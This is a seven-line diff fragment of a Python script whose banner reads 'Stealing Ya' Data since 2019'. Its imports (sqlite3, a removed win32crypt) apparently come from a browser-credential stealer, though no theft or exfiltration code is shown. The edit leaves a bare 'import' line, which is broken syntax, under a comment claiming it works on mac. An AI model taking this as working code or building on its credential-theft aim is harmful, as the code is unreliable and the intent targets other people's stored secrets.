@@ -1,7 +1,8 @@
+#Works on mac
 import os
 from os import getenv
 import sqlite3
-import win32crypt
+import
 
 print("""
 Stealing Ya' Data since 2019
